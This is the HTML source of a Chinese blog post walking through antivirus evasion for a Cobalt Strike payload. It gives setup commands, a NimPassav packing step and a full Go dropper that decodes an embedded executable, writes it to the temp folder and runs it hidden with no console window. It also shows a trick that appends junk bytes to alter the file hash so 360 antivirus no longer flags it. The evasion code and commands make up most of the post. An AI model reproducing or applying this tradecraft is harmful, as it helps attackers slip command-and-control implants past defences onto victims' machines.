@@ -1,0 +1,579 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 5.4.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"ithedogl.github.io","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
+  </script>
+
+  <meta name="description" content="王海兵大佬YYDS，有大佬带的感觉真好。">
+<meta property="og:type" content="article">
+<meta property="og:title" content="免杀和去黑窗">
+<meta property="og:url" content="https://ithedogl.github.io/2022/01/18/%E5%85%8D%E6%9D%80%E5%92%8C%E5%8E%BB%E9%BB%91%E7%AA%97/index.html">
+<meta property="og:site_name" content="沉沦">
+<meta property="og:description" content="王海兵大佬YYDS，有大佬带的感觉真好。">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://ithedogl.github.io/images/%E5%85%8D%E6%9D%80%E5%92%8C%E5%8E%BB%E9%BB%91%E7%AA%97/image-20220118153750369.png">
+<meta property="og:image" content="https://ithedogl.github.io/images/%E5%85%8D%E6%9D%80%E5%92%8C%E5%8E%BB%E9%BB%91%E7%AA%97/image-20220118154434367.png">
+<meta property="og:image" content="https://ithedogl.github.io/images/%E5%85%8D%E6%9D%80%E5%92%8C%E5%8E%BB%E9%BB%91%E7%AA%97/image-20220118154542478.png">
+<meta property="og:image" content="https://ithedogl.github.io/images/%E5%85%8D%E6%9D%80%E5%92%8C%E5%8E%BB%E9%BB%91%E7%AA%97/image-20220118154946998.png">
+<meta property="og:image" content="https://ithedogl.github.io/images/%E5%85%8D%E6%9D%80%E5%92%8C%E5%8E%BB%E9%BB%91%E7%AA%97/image-20220118155324837.png">
+<meta property="og:image" content="https://ithedogl.github.io/images/%E5%85%8D%E6%9D%80%E5%92%8C%E5%8E%BB%E9%BB%91%E7%AA%97/image-20220118155522794.png">
+<meta property="og:image" content="https://ithedogl.github.io/images/%E5%85%8D%E6%9D%80%E5%92%8C%E5%8E%BB%E9%BB%91%E7%AA%97/image-20220118160011899.png">
+<meta property="og:image" content="https://ithedogl.github.io/images/%E5%85%8D%E6%9D%80%E5%92%8C%E5%8E%BB%E9%BB%91%E7%AA%97/image-20220118161745064.png">
+<meta property="article:published_time" content="2022-01-18T06:46:05.148Z">
+<meta property="article:modified_time" content="2022-01-18T08:18:22.785Z">
+<meta property="article:author" content="thedog">
+<meta property="article:tag" content="免杀测试">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://ithedogl.github.io/images/%E5%85%8D%E6%9D%80%E5%92%8C%E5%8E%BB%E9%BB%91%E7%AA%97/image-20220118153750369.png">
+
+<link rel="canonical" href="https://ithedogl.github.io/2022/01/18/%E5%85%8D%E6%9D%80%E5%92%8C%E5%8E%BB%E9%BB%91%E7%AA%97/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>免杀和去黑窗 | 沉沦</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">沉沦</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>
+
+  </li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off"
+           placeholder="搜索..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div id="search-result">
+  <div id="no-result">
+    <i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://ithedogl.github.io/2022/01/18/%E5%85%8D%E6%9D%80%E5%92%8C%E5%8E%BB%E9%BB%91%E7%AA%97/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="thedog">
+      <meta itemprop="description" content="笑一个">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="沉沦">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          免杀和去黑窗
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+              
+
+              <time title="创建时间：2022-01-18 14:46:05 / 修改时间：16:18:22" itemprop="dateCreated datePublished" datetime="2022-01-18T14:46:05+08:00">2022-01-18</time>
+            </span>
+
+          
+  
+  <span class="post-meta-item">
+    
+      <span class="post-meta-item-icon">
+        <i class="far fa-comment"></i>
+      </span>
+      <span class="post-meta-item-text">Valine：</span>
+    
+    <a title="valine" href="/2022/01/18/%E5%85%8D%E6%9D%80%E5%92%8C%E5%8E%BB%E9%BB%91%E7%AA%97/#valine-comments" itemprop="discussionUrl">
+      <span class="post-comments-count valine-comment-count" data-xid="/2022/01/18/%E5%85%8D%E6%9D%80%E5%92%8C%E5%8E%BB%E9%BB%91%E7%AA%97/" itemprop="commentCount"></span>
+    </a>
+  </span>
+  
+  
+            <div class="post-description">王海兵大佬YYDS，有大佬带的感觉真好。</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>测试日期：2022.01.18</p>
+<p>效果：免杀360套装</p>
+<p>项目BypassAv-web：<a target="_blank" rel="noopener" href="https://github.com/M-Kings/BypassAv-web.git">https://github.com/M-Kings/BypassAv-web.git</a></p>
+<p>现在项目貌似已经不全了，当初2021.11.13第一次测试的时候有如下文件，winim-master是后来下载的环境，其他应该是项目自带的。</p>
+<p><img src="/../../../../images/%E5%85%8D%E6%9D%80%E5%92%8C%E5%8E%BB%E9%BB%91%E7%AA%97/image-20220118153750369.png" alt="image-20220118153750369"></p>
+<p>环境要求：python3和nim</p>
+<p>在kali上搭建测试环境，自带了python3，所以仅安装nim就够了</p>
+<h2 id="Nim安装"><a href="#Nim安装" class="headerlink" title="Nim安装"></a>Nim安装</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">apt update</span><br><span class="line">apt install nim		&#x2F;&#x2F;nim安装</span><br><span class="line">apt install mingw-w64		&#x2F;&#x2F;如果要编译出Windows下可以运行的exe和dll文件，那么必须安装mingw</span><br><span class="line">wget https:&#x2F;&#x2F;codeload.github.com&#x2F;khchen&#x2F;winim&#x2F;zip&#x2F;refs&#x2F;heads&#x2F;master  &#x2F;&#x2F;安装nim的依赖库</span><br><span class="line">unzip master</span><br><span class="line">cd winim-master&#x2F;</span><br><span class="line">nimble install</span><br></pre></td></tr></table></figure>
+
+<p><img src="/../../../../images/%E5%85%8D%E6%9D%80%E5%92%8C%E5%8E%BB%E9%BB%91%E7%AA%97/image-20220118154434367.png" alt="image-20220118154434367"></p>
+<h2 id="免杀制作"><a href="#免杀制作" class="headerlink" title="免杀制作"></a>免杀制作</h2><p>cs上生成payload.bin，上传到kali</p>
+<p><img src="/../../../../images/%E5%85%8D%E6%9D%80%E5%92%8C%E5%8E%BB%E9%BB%91%E7%AA%97/image-20220118154542478.png" alt="image-20220118154542478"></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 NimPassav.py -r payload.bin -t 64</span><br></pre></td></tr></table></figure>
+
+<p><img src="/../../../../images/%E5%85%8D%E6%9D%80%E5%92%8C%E5%8E%BB%E9%BB%91%E7%AA%97/image-20220118154946998.png" alt="image-20220118154946998"></p>
+<p>到了这一步生成的马虽然能免杀360，但是执行会持续有个黑窗，关掉后就会丢失会话</p>
+<h2 id="去黑窗"><a href="#去黑窗" class="headerlink" title="去黑窗"></a>去黑窗</h2><p>用RECalcTool.exe把上面exe转成base64字符</p>
+<p><img src="/../../../../images/%E5%85%8D%E6%9D%80%E5%92%8C%E5%8E%BB%E9%BB%91%E7%AA%97/image-20220118155324837.png" alt="image-20220118155324837"></p>
+<p>把字符串放入下面fileString的字符串中</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line">package main</span><br><span class="line"></span><br><span class="line">import (</span><br><span class="line">	&quot;bytes&quot;</span><br><span class="line">	&quot;compress&#x2F;zlib&quot;</span><br><span class="line">	&quot;encoding&#x2F;base64&quot;</span><br><span class="line">	&#x2F;&#x2F; &quot;fmt&quot;</span><br><span class="line">	&quot;io&quot;</span><br><span class="line">	&quot;io&#x2F;ioutil&quot;</span><br><span class="line">	&quot;os&quot;</span><br><span class="line">	&quot;syscall&quot;</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;fileString值替换为passav处理后的exe文件的base64字符串</span><br><span class="line">var fileString &#x3D; &quot;&quot;</span><br><span class="line"></span><br><span class="line">func main() &#123;</span><br><span class="line">	var sI syscall.StartupInfo</span><br><span class="line">	var pI syscall.ProcessInformation</span><br><span class="line">	var tempFile &#x3D; os.TempDir() + &quot;&#x2F;temp.exe&quot;</span><br><span class="line">	exe, _ :&#x3D; base64.StdEncoding.DecodeString(fileString)</span><br><span class="line">	&#x2F;&#x2F;exe2 :&#x3D; doZlibUnCompress(exe)</span><br><span class="line">	ioutil.WriteFile(tempFile, exe, 0666)</span><br><span class="line">	argv :&#x3D; syscall.StringToUTF16Ptr(tempFile)</span><br><span class="line">	_ &#x3D; syscall.CreateProcess(nil, argv, nil, nil, true, 0x08000000, nil, nil, &amp;sI, &amp;pI)</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;进行zlib解压缩</span><br><span class="line">func doZlibUnCompress(compressSrc []byte) []byte &#123;</span><br><span class="line">	b :&#x3D; bytes.NewReader(compressSrc)</span><br><span class="line">	var out bytes.Buffer</span><br><span class="line">	r, _ :&#x3D; zlib.NewReader(b)</span><br><span class="line">	io.Copy(&amp;out, r)</span><br><span class="line">	return out.Bytes()</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;进行zlib压缩</span><br><span class="line">func doZlibCompress(src []byte) []byte &#123;</span><br><span class="line">	var in bytes.Buffer</span><br><span class="line">	w :&#x3D; zlib.NewWriter(&amp;in)</span><br><span class="line">	w.Write(src)</span><br><span class="line">	w.Close()</span><br><span class="line">	return in.Bytes()</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p><img src="/../../../../images/%E5%85%8D%E6%9D%80%E5%92%8C%E5%8E%BB%E9%BB%91%E7%AA%97/image-20220118155522794.png" alt="image-20220118155522794"></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">go build  -ldflags &quot;-w -s&quot; proc.go 	&#x2F;&#x2F;要求go环境，生成proc.exe</span><br></pre></td></tr></table></figure>
+
+<p><img src="/../../../../images/%E5%85%8D%E6%9D%80%E5%92%8C%E5%8E%BB%E9%BB%91%E7%AA%97/image-20220118160011899.png" alt="image-20220118160011899"></p>
+<p>这里是直接在机器上双击执行的，360没反应，但是通过冰蝎这类执行，360还是会提示</p>
+<h2 id="换md5"><a href="#换md5" class="headerlink" title="换md5"></a>换md5</h2><p>之前一次演练后就开始被360杀了，奇怪的是这次重新写文章的时候发现360又没杀了，当时被360杀修改文件md5就又可以了</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">copy &#x2F;b proc.exe+1.txt cc.exe  &#x2F;&#x2F;1.txt内容随意，cc.exe为重新生成的，仍然可以重新上线</span><br></pre></td></tr></table></figure>
+
+<p><img src="/../../../../images/%E5%85%8D%E6%9D%80%E5%92%8C%E5%8E%BB%E9%BB%91%E7%AA%97/image-20220118161745064.png" alt="image-20220118161745064"></p>
+
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/%E5%85%8D%E6%9D%80%E6%B5%8B%E8%AF%95/" rel="tag"># 免杀测试</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2022/01/18/%E6%9D%82%E8%AE%B0/" rel="prev" title="杂记">
+      <i class="fa fa-chevron-left"></i> 杂记
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/2022/01/19/log4j2%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" rel="next" title="log4j2代码执行漏洞">
+      log4j2代码执行漏洞 <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+    <div class="comments" id="valine-comments"></div>
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%89%8D%E8%A8%80"><span class="nav-number">1.</span> <span class="nav-text">前言</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Nim%E5%AE%89%E8%A3%85"><span class="nav-number">2.</span> <span class="nav-text">Nim安装</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%85%8D%E6%9D%80%E5%88%B6%E4%BD%9C"><span class="nav-number">3.</span> <span class="nav-text">免杀制作</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%8E%BB%E9%BB%91%E7%AA%97"><span class="nav-number">4.</span> <span class="nav-text">去黑窗</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%8D%A2md5"><span class="nav-number">5.</span> <span class="nav-text">换md5</span></a></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="thedog"
+      src="/images/avatar.gif">
+  <p class="site-author-name" itemprop="name">thedog</p>
+  <div class="site-description" itemprop="description">笑一个</div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">14</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-tags">
+        <span class="site-state-item-count">12</span>
+        <span class="site-state-item-name">标签</span>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author motion-element">
+      <span class="links-of-author-item">
+        <a href="https://steamcommunity.com/profiles/76561198347024263/" title="steam → https:&#x2F;&#x2F;steamcommunity.com&#x2F;profiles&#x2F;76561198347024263&#x2F;" rel="noopener" target="_blank"><i class="fab fa-steam fa-fw"></i>steam</a>
+      </span>
+  </div>
+
+
+
+      </div>
+
+
+<script type="text/javascript" charset="utf-8" src="/js/tagcloud.js"></script>
+<script type="text/javascript" charset="utf-8" src="/js/tagcanvas.js"></script>
+<div class="widget-wrap">
+    <div id="myCanvasContainer" class="widget tagcloud">
+        <canvas width="250" height="250" id="resCanvas" style="width=100%">
+            <ul class="tag-list" itemprop="keywords"><li class="tag-list-item"><a class="tag-list-link" href="/tags/app/" rel="tag">app</a><span class="tag-list-count">2</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/cve-2020-1472/" rel="tag">cve-2020-1472</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E4%B8%8A%E7%BA%BF%E6%96%B9%E5%BC%8F/" rel="tag">上线方式</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%85%8D%E6%9D%80%E6%B5%8B%E8%AF%95/" rel="tag">免杀测试</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%9F%9F%E6%B8%97%E9%80%8F/" rel="tag">域渗透</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%8F%90%E6%9D%83/" rel="tag">提权</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%91%84%E5%83%8F%E5%A4%B4/" rel="tag">摄像头</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/" rel="tag">漏洞复现</a><span class="tag-list-count">6</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E7%A1%AC%E4%BB%B6/" rel="tag">硬件</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E8%80%83%E8%AF%81/" rel="tag">考证</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E8%84%9A%E6%9C%AC%E7%BC%96%E5%86%99/" rel="tag">脚本编写</a><span class="tag-list-count">2</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E9%92%93%E9%B1%BC/" rel="tag">钓鱼</a><span class="tag-list-count">2</span></li></ul>
+        </canvas>
+    </div>
+</div>
+
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2022</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">thedog</span>
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a> 强力驱动
+  </div>
+
+        
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/pjax/pjax.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/pisces.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+  <script>
+var pjax = new Pjax({
+  selectors: [
+    'head title',
+    '#page-configurations',
+    '.content-wrap',
+    '.post-toc-wrap',
+    '.languages',
+    '#pjax'
+  ],
+  switches: {
+    '.post-toc-wrap': Pjax.switches.innerHTML
+  },
+  analytics: false,
+  cacheBust: false,
+  scrollTo : !CONFIG.bookmark.enable
+});
+
+window.addEventListener('pjax:success', () => {
+  document.querySelectorAll('script[data-pjax], script#page-configurations, #pjax script').forEach(element => {
+    var code = element.text || element.textContent || element.innerHTML || '';
+    var parent = element.parentNode;
+    parent.removeChild(element);
+    var script = document.createElement('script');
+    if (element.id) {
+      script.id = element.id;
+    }
+    if (element.className) {
+      script.className = element.className;
+    }
+    if (element.type) {
+      script.type = element.type;
+    }
+    if (element.src) {
+      script.src = element.src;
+      // Force synchronous loading of peripheral JS.
+      script.async = false;
+    }
+    if (element.dataset.pjax !== undefined) {
+      script.dataset.pjax = '';
+    }
+    if (code !== '') {
+      script.appendChild(document.createTextNode(code));
+    }
+    parent.appendChild(script);
+  });
+  NexT.boot.refresh();
+  // Define Motion Sequence & Bootstrap Motion.
+  if (CONFIG.motion.enable) {
+    NexT.motion.integrator
+      .init()
+      .add(NexT.motion.middleWares.subMenu)
+      .add(NexT.motion.middleWares.postList)
+      .bootstrap();
+  }
+  NexT.utils.updateSidebarPosition();
+});
+</script>
+
+
+
+
+  
+
+
+
+
+  
+<script src="/js/local-search.js"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+    <div id="pjax">
+  
+
+  
+
+
+<script>
+NexT.utils.loadComments(document.querySelector('#valine-comments'), () => {
+  NexT.utils.getScript('//unpkg.com/valine/dist/Valine.min.js', () => {
+    var GUEST = ['nick', 'mail', 'link'];
+    var guest = 'nick,mail,link';
+    guest = guest.split(',').filter(item => {
+      return GUEST.includes(item);
+    });
+    new Valine({
+      el         : '#valine-comments',
+      verify     : false,
+      notify     : false,
+      appId      : 'Q9yIHCeu9YgeOBK4PDlf45fD-gzGzoHsz',
+      appKey     : 'Ny4HdnMmkjlvgFBeGiA6Hgor',
+      placeholder: "吱一声",
+      avatar     : 'mm',
+      meta       : guest,
+      pageSize   : '10' || 10,
+      visitor    : false,
+      lang       : 'zh-cn' || 'zh-cn',
+      path       : location.pathname,
+      recordIP   : false,
+      serverURLs : ''
+    });
+  }, window.Valine);
+});
+</script>
+
+    </div>
+</body>
+</html>
